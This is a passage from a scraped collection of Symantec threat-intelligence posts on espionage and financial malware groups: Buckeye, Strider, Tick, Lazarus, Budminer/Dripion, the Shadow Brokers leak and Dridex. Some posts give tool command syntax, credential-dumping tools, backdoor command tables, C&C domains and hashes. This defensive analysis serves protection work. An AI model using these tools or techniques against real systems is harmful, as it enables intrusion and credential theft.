Strike, possible ATM implants Cobalt Strike implants Backdoor.Batel loaders Ammyy Admin remote administration tools Ammyy Admin, Trojanized RemoteUtilities remote administration tools The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/odinaff-trojan-financial-attacks"
  },
  {
    "title": "buckeye cyberespionage hong kong",
    "content": "Buckeye (also known as APT3, Gothic Panda, UPS Team, and TG-0110) is a cyberespionage group that is believed to have been operating for well over half a decade. Traditionally, the group attacked organizations in the US as well as other targets. However, Buckeye’s focus appears to have changed as of June 2015, when the group began compromising political entities in Hong Kong. Since March 2016, the group has appeared to mostly focus on organizations in Hong Kong, sending malicious emails to targets as recently as August 4, and attempting to spread within compromised networks in order to steal information. Using the combined threat intelligence of Symantec and Blue Coat Systems, we have built a clear and concise picture of how Buckeye has evolved its tactics in recent years. This has allowed us to further enhance our protection capabilities against the group’s campaigns. Symantec has observed Buckeye activity dating back to 2009, involving attacks on various organizations in several regions. Buckeye used a remote access Trojan (Backdoor.Pirpi) in attacks against a US organization’s network in 2009. The group delivered Backdoor.Pirpi through malicious attachments or links in convincing spear-phishing emails. Symantec has identified additional tools used by the group, which will be discussed later. Buckeye has been known to exploit zero-day vulnerabilities in the past, such asCVE-2010-3962in an campaign in 2010 and CVE-2014-1776 in 2014. Although other zero-day attacks have been reported, they have not been confirmed by Symantec. All zero-day exploits known, or suspected, to have been used by this group are for vulnerabilities in Internet Explorer and Flash. More recently, Symantec telemetry has revealed Backdoor.Pirpi connections from compromised computers based in Hong Kong dating back to August 2015. The infections significantly increased in number towards the end of March 2016 and the beginning of April 2016. Additional investigations discovered related malware samples and determined that targeted organizations were political entities in Hong Kong. In at least some of these recent attacks, Buckeye used spear-phishing emails with a malicious .zip attachment. The .zip archive attached to the email contains a Windows shortcut (.lnk) file with the Microsoft Internet Explorer logo. Clicking on the shortcut ultimately leads to Backdoor.Pirpi being downloaded and executed on the affected computer. From 2015 to date, Symantec identified approximately 82 organizations in various regions that had Buckeye tools present on their network. However, this is not an accurate picture of the targets of interest to Buckeye. The group casts a wide net while trawling for targets but only remains active on the networks of organizations it is interested in. Symantec determined a more accurate picture of Buckeye’s targets by looking at where Buckeye remained active on the network longer than a day, deployed additional tools, and spread onto multiple computers. After these filters were applied to our data, we found a total of 17 organizations, located in Hong Kong (13), the US (3), and the UK (1). It should be noted that this data goes back to 2015 and that the proportion of targets in Hong Kong from March 2016 would be considerably higher. Up to mid-2015, Buckeye’s traditional targets were varying categories of US organizations, which match the types of victims seen in the UK. Buckeye interests changed substantially around June 2015 when the group began infecting organizations in Hong Kong. Infections in the UK and US ceased shortly after this time. Buckeye uses a number of hacking tools as well as malware. Many of the hacking tools are open source applications that have been patched or modified in some manner by Buckeye in an attempt to evade detection. Buckeye uses Backdoor.Pirpi, a remote access Trojan capable of reading, writing, and executing files and programs. Backdoor.Pirpi also collects information about the target’s local network, including the domain controller and workstations. As mentioned previously, Buckeye also uses a number of hacking tools, including the following: Keylogger: The keylogger is configured using the command line parameters: NetworkService, Replace, Install, Register and Unregister. These parameters install it as a service. The keylogger then records keystrokes in encrypted files, for example: thumbcache_96.dbx. It also gathers network information such as the MAC address, IP address, WINS, DHCP server, and gateway. RemoteCMD: This tool executes commands on remote computers, similar to the PsExec tool. Usage is: %s shareIp domain[USER INFORMATION|[USER NAME AND PASSWORD]] [/run:[COMMAND]] The commands to be passed consist of upload, download, Service (create, delete, start, stop), delete, rename, andAT PwDumpVariant: This tool imports lsremora.dll (often downloaded by the attacker as part of the toolset) and uses the GetHash export of this DLL. On execution, the tool injects itself into lsass.exe and is triggered with the argument “dig”. OSinfo: OSInfo is a general purpose, system information gathering tool. It has the following command line argument help: info  <Server/Domain> [options][options]:-d Domain-o OsInfo-t TsInfo-n NetuseInfo-s ShareInfo ShareDir-c Connect Test-a Local And Global Group User Info-l Local Group User Info-g Global Group User Info-ga Group Administrators-gp Group Power Users-gd Group Domain Admins-f <infile> //input server list from infile, OneServerOneLineinfo <\\\\server> <user> ChromePass: A tool from NirSoft used for recovering passwords stored in the Chrome browser. Lazagne: A compiled Python tool that extracts passwords from various locally installed application classes, such as web browsers. The full list is: chats, svn, wifi, mails, windows, database, sysadmin, and browsers. Buckeye seems to target file and print servers, which makes it likely the group is looking to steal documents. This, coupled with the group’s use of zero-day exploits in the past, customized tools, and the types of organizations being targeted would suggest that Buckeye is a state-sponsored cyberespionage group. Symantec, Norton, and Blue Coat products protect against the activities of this cyberespionage group. Symantec and Norton products offer the following detections: Intrusion prevention system The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/buckeye-cyberespionage-hong-kong"
  },
  {
    "title": "equation cyberespionage group breached",
    "content": "An attack group calling itself the Shadow Brokers has released a trove of data it claims to have stolen from the Equation cyberespionage group. The data contains a range of exploits and tools the attack group state were used by Equation. The Shadow Brokers said that the data dump was a sample of what had been stolen from hacking Equation and that the “best” files would be auctioned off to the highest bidder. Equation was uncovered last year, when it was found to be using highly advanced malware tools to target organizations in a range of countries. The group is technically competent and well resourced, using highly developed malware tools that go to great lengths to evade detection. Symantec Security Response is analyzing the data released by Shadow Brokers in order to assess the accuracy of the group's claims and will update our malware and exploit protections if necessary. Q: How much data has been released?A: Shadow Brokers released a 256-megabyte compressed archive containing around 4,000 files. Q: What kinds of files are in the archive?A: The files mainly appear to be installation scripts, configuration files, and exploits targeting a range of routers and firewall appliances. Q: How old is the data?A: Most of the files appear to be several years old, dating back to between 2010 and 2013. Q: Does the data dump actually contain working exploits?A: It will take some time to assess all of the released files. However, early indications are that at least some of the tools released are functioning exploits. Q: What do we know about Shadow Brokers?A: The group has no prior history. While it may be previously unknown, “Shadow Brokers” could also be a cover name for another group. Q: What do we know about the unreleased data held by the group?A: Very little. It has said it is keeping this a secret and simply claimed that it contains the “best” files. Q: How will it auction the unreleased data?A: The group provided a Bitcoin address and instructed interested parties to send Bitcoin to it. Losing bids would not be refunded and instead losing bidders would be granted “consolation prizes”. It claimed it was seeking to raise the incredibly large sum of 1 million Bitcoin (US$576.3 million) and, if it received this, it would publicly release more data. Q: Is it possible this is a hoax?A: While the files released are certainly not junk, it will take some time to fully establish if they are definitely linked to the Equation group. Q: Does the data dump have links to any known tools?A: Some of the files reference alleged US National Security Agency (NSA) tools named in the Edward Snowden leaks, e.g. “EPIC BANANA”, “EXTRA BACON”, and “ELIGIBLE CONTESTANT.” However, since these names were already public information it doesn’t provide proof of the files’ origin. Update – August 18, 2016: Q: There have been reports that leaked files contain a unique implementation of the RC5/RC6 encryption algorithm that has previously only been seen in Equation Group malware. Can you corroborate this?A: We don’t believe this can prove a definite link between the two. The RC5/RC6 implementations are similar, in that some values used for instantiating the algorithm in their implementation were negated. However, further analysis by Symantec found a large number of files previously seen in the wild where these values were also present. We believe that the negated values might be an optimization introduced by the compiler used. In short, the similarities could have come about by accident rather than design. Q: Have patches been released for any of the vulnerabilities disclosed in the leak?A: To date, Cisco and Fortinet have issued security updates after exploits for their products were found in the leak.Cisco saidthat the leaked files contained exploits of two vulnerabilities affecting a number of its products: the Cisco ASA (Adaptive Security Appliance) and legacy Cisco PIX firewalls. The company has issued security advisories for both: Cisco said that the while CVE-2016-6366 was a newly discovered vulnerability, CVE-2016-6367 had been fixed in 2011. Meanwhile Fortinet has published asecurity advisoryabout a cookie parser buffer overflow vulnerability which it said affected older versions of its FortiGate (FOS) firmware, versions 4.3.8 and below. Customers are advised to upgrade to release 5.x or upgrade to 4.3.9 or above for models not compatible with 5.x. Q: Did the leak include any exploits for Symantec products?A: No exploits of Symantec products were found in the released files. Our investigation is still in progress. Update – August 23, 2016: Q: Are Juniper Networks products affected by the leak?A: Juniper Networks has said the leakincluded tools targeting its NetScreen devices. “As part of our analysis of these files, we identified an attack against NetScreen devices running ScreenOS,” a Juniper Networks spokesperson said. “We are examining the extent of the attack, but initial analysis indicates it targets the boot loader and does not exploit a vulnerability on ScreenOS devices.” The company said it would continue its analysis and publish any new information in a blog or security advisory once more is known. Q: Has any money been sent to the Shadow Brokers yet?A: Records associated with the Bitcoin address provided by the Shadow Brokers show that the group  has received 63 payments totaling 1.76 Bitcoin (approximately US$1,023). The majority came from a single payment of 1.5 Bitcoin. Q: Do Symantec products detect the tools released in the leak?A: Symantec and Norton products protect against the malware and exploits found in the leak with the following detections: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/equation-cyberespionage-group-breached"
  },
  {
    "title": "strider cyberespionage sauron",
    "content": "A previously unknown group called Strider has been conducting cyberespionage-style attacks against selected targets in Russia, China, Sweden, and Belgium. The group uses an advanced piece of malware known as Remsec (Backdoor.Remsec) to conduct its attacks. Remsec is a stealthy tool that appears to be primarily designed for spying purposes. Its code contains a reference to Sauron, the all-seeing antagonist in Lord of the Rings. Strider’s attacks have tentative links with a previously uncovered group,Flamer. The use of Lua modules, which we’ll discuss later, is a technique that has previously been used by Flamer. One of Strider’s targets had also previously been infected byRegin. Strider has been active since at least October 2011. The group has maintained a low profile until now and its targets have been mainly organizations and individuals that would be of interest to a nation state’s intelligence services. Symantec obtained a sample of the group’s Remsec malware from a customer who submitted it following its detection by our behavioral engine. Remsec is primarily designed to spy on targets. It opens a back door on an infected computer, can log keystrokes, and steal files. Strider has been highly selective in its choice of targets and, to date, Symantec has found evidence of infections in 36 computers across seven separate organizations. The group’s targets include a number of organizations and individuals located in Russia, an airline in China, an organization in Sweden, and an embassy in Belgium. The Remsec malware used by Strider has a modular design. Its modules work together as a framework that provides the attackers with complete control over an infected computer, allowing them to move across a network, exfiltrate data, and deploy custom modules as required. Remsec contains a number of stealth features that help it to avoid detection. Several of its components are in the form of executable blobs (Binary Large Objects), which are more difficult for traditional antivirus software to detect. In addition to this, much of the malware’s functionality is deployed over the network, meaning it resides only in a computer’s memory and is never stored on disk. This also makes the malware more difficult to detect and indicates that the Strider group are technically competent attackers. Remsec modules seen by Symantec to date include: Strider is capable of creating custom malware tools and has operated below the radar for at least five years. Based on the espionage capabilities of its malware and the nature of its known targets, it is possible that the group is a nation-state level attacker. Symantec will continue to search for more Remsec modules and targets in order to build upon our understanding of Strider and better protect our customers. Symantec and Norton products detect this threat as Backdoor.Remsec. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/strider-cyberespionage-sauron"
  },
  {
    "title": "swift malware financial attacks",
    "content": "Symantec has found evidence that a bank in the Philippines has also been attacked by the group that stole US$81 million from the Bangladesh central bank and attempted to steal over $1 million from the Tien Phong Bank in Vietnam. Malware used by the group was also deployed in targeted attacks against a bank in the Philippines. In addition to this, some of the tools used share code similarities with malware used in historic attacks linked to a threat group known as Lazarus. The attacks can be traced back as far as October 2015, two months prior to the discovery of the failed attack in Vietnam, which was hitherto the earliest known incident. The attack against the Bangladesh central banktriggered an alert by payments network SWIFT, after it was found the attackers had used malware to cover up evidence of fraudulent transfers.SWIFT issued a further warning, saying that it had found evidence of malware being used against another bank in a similar fashion.Vietnam’s Tien Phong Bank subsequently statedthat it intercepted a fraudulent transfer of over $1 million in the fourth quarter of last year. SWIFT concluded that the second attack indicates that a “wider and highly adaptive campaign” is underway targeting banks. A third bank, Banco del Austro in Ecuador,was also reported to have lost $12 million to attackersusing fraudulent SWIFT transactions. However, no details are currently known about the tools used in this incident or if there are any links to the attacks in Asia. Symantec has identified three pieces of malware which were being used in limited targeted attacks against the financial industry in South-East Asia: Backdoor.Fimlis, Backdoor.Fimlis.B, and Backdoor.Contopee. At first, it was unclear what the motivation behind these attacks were, however code sharing between Trojan.Banswift (used in the Bangladesh attack used to manipulate SWIFT transactions) and early variants of Backdoor.Contopee provided a connection. While analyzing samples of Trojan.Banswift, a distinct file wiping code was found. Some of the distinctive properties of the wiping code include: Already this code looked fairly unique. What was even more interesting was that when we searched for additional malware containing the exact combination of “control” bytes, an early variant of Backdoor.Contopee and the“msoutc.exe”sample already discussed inthe recent BAE bloganalyzing the Bangladesh attack were also found. Symantec believes distinctive code shared between families and the fact that Backdoor.Contopee was being used in limited targeted attacks against financial institutions in the region, means these tools can be attributed to the same group. Backdoor.Contopee has been previously used by attackers associated with a broad threat group known as Lazarus.Lazarus has been linked to a string of aggressive attacks since 2009, largely focused on targets in the US and South Korea. The group was linked to Backdoor.Destover, a highly destructive Trojan that was the subject of an FBI warning after it was used in an attack against Sony Pictures Entertainment. The FBI concluded that the North Korean governmentwas responsible for this attack. The group was the target of a cross-industry initiative known as Operation Blockbuster earlier this year, which involved major security vendors sharing intelligence and resources in order to assist commercial and government organizations in protecting themselves against Lazarus. As part of the initiative, vendors are circulating malware signatures and other useful intelligence related to these attackers. The discovery of more attacks provides further evidence that the group involved is conducting a wide campaign against financial targets in the region. While awareness of the threat posed by the group has now been raised, its initial success may prompt other attack groups to launch similar attacks. Banks and other financial institutions should remain vigilant. Symantec and Norton products protect against these threats with the following detections: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/swift-malware-financial-attacks"
  },
  {
    "title": "tick cyberespionage japan",
    "content": "A longstanding cyberespionage campaign has been targeting mainly Japanese organizations with its own custom-developed malware (Backdoor.Daserf). The group, known to Symantec as Tick, has maintained a low profile, appearing to be active for at least 10 years prior to discovery. In its most recent campaign, Tick employed spear-phishing emails and compromised a number of Japanese websites in order to infect a new wave of victims. The group is highly selective in its approach and only appears to deploy its full range of tools once it establishes that the compromised organization is an intended target. Tick also uses a range of hacktools to map the victim’s network and attempt to escalate privileges further. Daserf’s main purpose is information stealing and the Trojan is capable of gathering information from infected computers and relaying it back to attacker-controlled servers. Tick’s most recent attacks have concentrated on the technology, aquatic engineering, and broadcasting sectors in Japan. Symantec discovered the most recent wave of Tick attacks in July 2015, when the group compromised three different Japanese websites with a Flash (.swf) exploit to mount watering hole attacks. Visitors to these websites were infected with a downloader known as Gofarer (Downloader.Gofarer). Gofarer collects information about the compromised computer and then downloads and installs Daserf. Tick also used spear-phishing emails in these recent attacks. While Symantec did not find the emails themselves, it did identify the use of an exploit designed to take advantage of a vulnerability in Microsoft Office documents (CVE-2014-4114). This was used to distribute malware in addition to the watering hole activity. Daserf appears to be custom-developed for use in Tick’s cyberespionage campaigns. Once installed, it establishes a remote connection to Tick’s command and control server, providing the attacker with access to the compromised computer. Once the malware is installed on a targeted computer, the attackers attempt to enumerate the network and escalate their privilege level. To do this, Tick uses a number of publicly available hacktools such as Mimikatz, GSecdump, and Windows Credential Editor. The tools are downloaded and deployed to the original install directory previously created by the malware. Tick’s primary objective appears to be the theft of sensitive information from targeted Japanese organizations. To date, Symantec has observed the group attempting to steal emails and documents such as PowerPoint presentations. The Daserf Trojan employs a number of tactics to avoid detection. Once collected, the stolen data is hidden in password-protected .rar archives. Daserf also uses file and folder names related to legitimate programs often found in Windows environments in order to blend in. Observed folder names include HP, Intel, Adobe, and perflogs and folders are generally created in either the root drive or the Application Data or Program Files folders. File names used in recent attacks include adobe.exe, adobe_sl.exe, intel.exe, and intellog.exe. Tick uses compromised web servers to distribute malware and, in some instances, for its command and control (C&C) infrastructure. However, in most cases, it relies on its own infrastructure for C&C purposes. In its most recent campaigns, the group registered the domains used for C&C servers days after the malware was compiled. For example, one of the variants of Daserf used was compiled on July 8, 2015. This sample was seen contacting the C&C domain www[.]dreamsig[.]com, which was first registered on July 13, 2015, five days after the compilation date. This pattern occurred in multiple Daserf samples. Another interesting aspect of the communication between the malware and the C&C infrastructure is how the malware changes the URL from a randomly chosen variable selected from a predefined list. Predefined list from Daserf MD5: 765017E16842C9EB6860A7E9F711B0DB Symantec identified multiple C&C domains used by Tick. Unfortunately, Tick frequently used either privacy protection services or domain brokers to mask registration information. These tactics are used to make discovery and attribution more difficult. The majority of the malware analyzed was not digitally signed. However, a small percentage was signed with a stolen digital certificate. It is unclear why the certificate was used so sparingly, since signed malware would receive a greater level of trust and reduce the risk of detection. It is possible that the certificate was used against a target that had a secure environment which may have required binaries to be signed in order to interact with the operating system. The issuer of the certificate has been informed of its misuse and confirmed that it would be revoked. The use of compromised websites to infect victims results in unintentional infections, making it difficult to identify the motives of the attacker. By searching for evidence of post-infection activity, Symantec identified seven organizations where Tick had mounted persistent post-compromise attacks. These organizations were primarily large Japanese technology, engineering, and media firms. The seven organizations therefore appear to be Tick’s intended targets. In addition to seeing post-compromise tools used in these attacks, the length of time the attackers were active on the networks provided additional evidence that these were high-value targets. The longest time Tick was active in a victim’s environment was 18 months. The average timeframe was five months and the number of infected hosts in a victim’s network ranged from 3 to 15 systems. Tick has left a trail of evidence indicating that its activity began as early as 2006. In earlier attacks, the group used malicious Microsoft Word documents to infect victims, with compromised websites being added to the mix as a more recent attack vector. Tick appears to be a well-organized group, with the funding and capability to develop and update its malware. It has the ability to compromise legitimate infrastructure to use for malware distribution and has access to stolen digital certificates to sign its malware when needed. Tick primarily uses purchased infrastructure for its C&C servers and has been able to stay off the radar since 2006. Tick exhibits all the hallmarks of an advanced cyberespionage group. The long lifespan of the group, as well as the consistent targeted attacks against specific industries, support this theory. The individuals or organization behind Tick’s operations has an interest in Japanese technology along with Japanese media and broadcasting organizations. While Tick’s tactics may change over time, the group’s history indicates that its focus will continue to be a narrow range of targets, mainly in Japan. Symantec and Norton products protect against these threats with the following detections: Intrusion prevention system The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/tick-cyberespionage-japan"
  },
  {
    "title": "taiwan cyberespionage backdoor trojan",
    "content": "In late August 2015, Symantec identified a previously unknown back door Trojan (Backdoor.Dripion) infecting organizations primarily located in Taiwan, as well as Brazil and the United States. Dripion is custom-built, designed to steal information, and has been used sparingly in a limited number of targeted attacks. The attackers behind this campaign went to some lengths to disguise their activities, including using domains names disguised as antivirus (AV) company websites for their command and control (C&C) servers. These attacks have some links to earlier attacks by a group called Budminer involving the Taidoor Trojan (Trojan.Taidoor). The threat posed by custom malware such as Dripion illustrates the value of multilayered security. Unknown threats may evade signature-based detection, but can be blocked by other detection tools which identify malicious behavior. Our investigation began when we received three file hashes, which we determined to have the functionality of a back door with information-stealing capabilities. The malware appeared to be new, rarely detected, and not publicly available. As we analyzed the binary and compared it against other known back door Trojans, we realized this was custom-developed malware. Developing a back door with information-stealing capabilities designed to evade detection requires both knowledge and funding. Usually when we see a new back door Trojan like this, it is tied to organizations involved in cyberespionage campaigns. One of the first steps taken when investigating malware is to determine how it is getting onto a victim’s computer. Many publicly available downloaders exist; however, only a few unique downloaders have been used over the past few years that have been exclusive to cyberespionage activity. Since Dripion appeared to be used by a single attacker against a small target group, we wanted to determine if the downloader could provide additional evidence to help attribute the threat to any known threat groups. The downloader was identified as Downloader.Blugger (MD5: 260f19ef39d56373bb5590346d2c1811). It is not a new piece of malware, having been in existence since at least 2011. How the victim was infected with Blugger is currently unknown. Blugger used encryption to make its infrastructure and commands queried in the URL requests harder to detect. After decrypting however, we identified the following URL requests: Both of the domains we analyzed in the URLs requested by the downloader are publicly accessible blogs. The downloader contacts these blog URLs in order to retrieve Dripion for installation. The blog posts are primarily in English yet most of the targets are based in Taiwan. As illustrated in Figure 1, one of the blogs references US healthcare spending.  It is unknown if the attacker created the blog or simply compromised another to use in their attacks. If the blog was compromised, then the attacker likely would not create posts themselves as it would show the blog’s creator that something was awry. If the blog was created by the attacker, it may be an attempt to develop a blog with topics that would likely be of interest to the intended target. Most of the blogs were related to news events. The Dripion back door TrojanOnce Dripion is installed, the attacker can access the user’s computer. Dripion has the functionally of a back door Trojan, letting attackers upload, download, and steal pre-determined information from the victim, and execute remote commands. Information such as the victim’s computer name and IP address are automatically transmitted to the C&C server upon the initial infection. GoSleepSleeps for 10 minutes GoKillAttempts to delete itself and ends its activities GoByeDisconnects from the computer nodataSimilar to GoBye CommandExecute command (lpCommandLine in CreateProcessA), redirect result through pipe to .tmp file and Download file UpFileWrite data in file on victim's computer DownFileWrite data to a remote open file (InternetWriteFile). The .tmp file used may be deleted after success operation. ExecuteFileCreate a new process (CreateProcessA) Table1. Commands associated with the Dripion malware Additionally, the developer of the Dripion malware used XOR encoding for both the binary configuration file (XOR: 0xA8) as well as network requests with the C&C server (XOR: 0xA3), to make detection more difficult. Dripion has been identified in multiple variations and has version numbers hardcoded within the malware. This indicates that the attackers have the ability to both create and develop their own custom malware as well as update their code to provide new capabilities and make detection more difficult. The use of publicly accessible blogs to distribute malware is a tactic we have seen previously, but few cyberespionage groups have used this technique. Fewer still have used this strategy to deliver custom-developed malware not often seen in the wild. The first piece of evidence pointing towards a link with previous cyberespionage campaigns was the use of the Blugger downloader, which has only been used by a group Symantec calls Budminer. This group has used Blugger to distribute its own custom malware known as Taidoor (Trojan.Taidoor). Symantec haspreviously written about Budminer’s Taidoor campaigns. Significantly, this is the first time we have seen Blugger used to deliver malware other than Taidoor. Further investigation uncovered a second tie with earlier Budminer activity. One of the Blugger samples associated with Dripion connected with a root domain also used in Taidoor-related activity. Both of the URL queries originated from the Blugger downloader which connected to the blog classic-blog.[REDACTED DOMAIN 1].com. They then call out to subdomains of the domain [REDACTED DOMAIN 3].net. Both Dripion and Taidoor not only connected to the same website (classic-blog.[REDACTED DOMAIN 1].com) but also used the same URL (classic-blog.[REDACTED DOMAIN 1].com /nasyzk/[ENCODED TEXT]) to obtain the encrypted C&C configuration. Symantec first identified activity involving Dripion in September 2015. Based on the timestamp of the earliest known sample however, Dripion may have been in existence since 2013. The Dripion activity that we have analyzed is extremely targeted and has involved far fewer victims compared to the number of users infected with Taidoor. The similarity between the two sets of activity is the number of unique file hashes found infecting users located in Taiwan. Unfortunately, we need more data to determine if the timestamps associated with Dripion dating back to November 2013 (7ad3b2b6eee18af6816b6f4f7f7f71a6) are legitimate or if they have been forged. The earliest known Dripion activity we were able to validate took place in November 2014. Despite the one-year gap in activity, it is possible that campaigns involving Dripion happened during this period and went undetected due to its small target window. Another interesting tactic used to deceive potential targets lies within the C&C infrastructure. The attackers created multiple domains with names similar to that of legitimate companies and websites in the antivirus community. For example the domains hyydn.nortonsoft[.]com and  mhysix.mcfeesoft[.]com were both C&C domains used in attacks. Using typo-squat domains to mimic legitimate sites is a tactic frequently used to trick the targets as well as defenders, in an effort to make the domains blend in with normal activity. We began this investigation with what we believed was a new campaign using an unidentified back door Trojan against targets primarily in Taiwan. As the investigation grew we found multiple ties between this newly discovered attack and activity associated with the Budminer cyberespionage group: We compared Dripion against Taidoor malware samples to determine if there was any shared code or if it may have originated from the same developer. Our findings concluded there were no similarities between the two malware families. However, the downloader used by both malware families has unique attributes, and we believe it to be from the same developer. So what does all this mean? Attribution of cyberespionage groups is difficult and needs to be done carefully based on fact and not assumptions. We have a number of ties between the two sets of activity.  Not all of the ties are strong on their own, but together provide a strong case that there is a relationship between the groups targeting Taiwan using Dripion and Taidoor malware. Based on the evidence we have presented Symantec attributed the activity involving the Dripion malware to the Budminer advanced threat group. While we have not seen new campaigns using Taidoor malware since 2014, we believe the Budminer group has changed tactics to avoid detection after being outed publicly in security white papers and blogs over the past few years. This investigation is just one example of Symantec’s ongoing effort to identify unknown emerging threats. By remaining one step ahead of adversaries, we can protect customers with intelligence-driven security. Symantec and Norton products protect against these threats with the following detections: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/taiwan-cyberespionage-backdoor-trojan"
  },
  {
    "title": "operation blockbuster lazarus",
    "content": "A collaborative cross-industry operation has targeted an aggressive threat group known as Lazarus. The initiative, called Operation Blockbuster was led by analytics firm Novetta and aims to significantly bolster defenses against the cyberespionage group and its disruptive campaigns. Symantec has been tracking attacks associated with Lazarus since 2009. It has been linked to a wide range of incidents, several of which involved highly destructive malware. Lazarus appears to be particularly focused on targets in the US and South Korea. Announced today, Operation Blockbuster involves major security vendors sharing intelligence and resources in order to assist commercial and government organizations in protecting themselves against Lazarus. As part of the initiative, vendors will circulate malware signatures and other useful intelligence related to these attackers. Active since at least 2009, Lazarus is a well-resourced adversary, capable of mounting cyberespionage operations in addition to high-profile destructive attacks. There is some evidence to suggest that Lazarus may consist of several associated groups of attackers. If this is the case, then it is possible that these groups are acting in concert, under the direction of one entity. Lazarus has been linked to a series of attacks since 2009. Symantec has observed commonalities between multiple targeted campaigns it may have been involved with. Lazarus is notable for its use of aggressive and destructive tactics, such as the use of disk-wiping malware, to cause maximum disruption to its targets One of the earliest attacks linked to Lazarus occurred when distributed denial of service attacks (DDoS) attacks knockeda number of US and South Korean websites offline. A Trojan known as Dozer (detected by Symantec as Trojan.Dozer) mounted the DDoS attacks using computers it had previously compromised. Dozer was spread through emails in a campaign involving a number of worms (detected as W32.Dozer, W32.Mydoom.A@mm, and W32.Mytob!gen). A similar wave of DDoS attacks hit South Korean websites in 2011, this time involving more destructive malware known as Trojan.Koredos. The Koredos Trojan not only used the infected computer to mount DDoS attacks; it also wiped the computer after a short period of time. Upon infection, the Trojan scanned for a number of different file types and copied them into an inaccessible encrypted .cab file before deleting the originals. A number of files that the Trojan searched for were related to software predominantly used in Korea (e.g. .alz, .gul, and .hwp). After this, the Trojan delivered the coup de grâce by deleting the master boot record (MBR) on all connected drives between 7 and 10 days after the initial infection. This resulted in Windows being unable to restart, effectively rending the computer unusable. Lazarus was also linked to aseries of destructive attacks against a number of South Korean corporations in 2013. Banks, broadcasters, and telecoms companies were among those affected. The attacks were reported to have compromised the targets’ servers with a disk-wiping Trojan (detected by Symantec as Trojan.Jokra). In addition to this, one telecoms firm had its website defaced with an animated image of skulls and a message from the alleged attackers, who called themselves the “Whois” team. Aggressive attacks linked to Lazarus continued in 2014and the group was linked to Backdoor.Destover, a highly destructive Trojan that was the subject of an FBI warning after it was used in an attack against Sony Pictures Entertainment. The FBI concluded that the North Korean governmentwas responsible for this attack. Although used against US targets, Destover shared several links to earlier attacks directed at targets in South Korea. Some samples of Destover reported to a command and control (C&C) server that was also used by a version of Trojan.Volgmer, which was crafted to attack South Korean targets. The shared C&C server indicated that the same group may have been behind both attacks. An updated version of this malware (detected as Trojan.Volgmer.B) has been used in more recent attacks against large South Korean companies. Some of the most recent activity linked to Lazarusinvolved a Trojan detected as Backdoor.Duuzer. Although detected in a range of locations, one of the threat’s targets was the South Korean manufacturing industry. Duuzer’s main function appears to be cyberespionage. The Trojan provides attackers with remote access to the compromised computer, and allows them to download additional files and steal data. There was also some evidence to suggest that the attackers behind Duuzer were spreading two other threats, detected as W32.Brambul and Backdoor.Joanap, to target more organizations in South Korea. Both pieces of malware appear to be designed to download extra payloads and carry out reconnaissance on infected computers. Ongoing vigilance requiredAttacks associated with Lazarus have frequently been highly destructive. Aside from the level of aggression displayed, Lazarus is notable for the range of tools used and the fact that it is linked to destructive attacks and lower-profile, espionage operations. By pooling together our respective insights into Lazarus, Symantec and other members of the Operation Blockbuster team hopes to strike a blow to this group while ensuring that our customers have robust protection against its tools. ProtectionSymantec and Norton products protect against threats associated with Lazarus with the following detections: Intrusion prevention system The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/operation-blockbuster-lazarus"
  },
  {
    "title": "dridex financial trojan spam",
    "content": "Tidal waves of spam are fuelling the growth of the Dridex Trojan, which has emerged as one of the most dangerous financial threats over the past year. The sheer size of the spam campaigns spreading Dridex (detected by Symantec as W32.Cridex) can sometimes overwhelm organizations hit by them. Symantec analysis of recent Dridex spam campaigns found that they are operating on a vast scale, with millions of new emails being sent out on a daily basis. The attackers behind Dridex are disciplined and professional. They operate on a standard working week, continually refine the malware, and put significant effort into disguising their spam campaigns as legitimate emails. As detailed in a newSymantec whitepaperpublished today, at least 145 Dridex spam campaigns were observed during one sample 10-week period. The average number of emails blocked by Symantec per campaign was 271,019, indicating that the total number of emails being sent every day runs to millions. Almost three quarters (74 percent) of Dridex spam campaigns used real company names in the sender address and frequently in the email text. The vast majority of spam campaigns were disguised as financial emails, such as invoices, receipts, and orders. The spam was heavily focused on English speakers, with the majority of emails purporting to come from English-speaking companies. Dridex is mainly used to steal banking credentials. The malware is configured to target the customers of nearly 300 different organizations in over 40 regions. Dridex is heavily focused on customers of financial institutions in wealthy, English-speaking countries, with the majority of targeted organizations located in these countries. The attackers also prioritized other European nations, along with a range of Asia-Pacific regions. The number of Dridex infections detected by Symantec rose during 2015. Between January and April, there were less than 2,000 infections per month. Infection numbers spiked considerably in the following months, hitting almost 16,000 in June before dropping and stabilizing at a rate of 3,000 to 5,000 per month in the final quarter. Dridex infections were detected in a wide range of regions during 2015. English-speaking countries, such as the US, UK, and Australia experienced high rates of infection. This was due to how the attackers configured the malware to attack the large number of banks in these regions, as well as the number of English-language spam 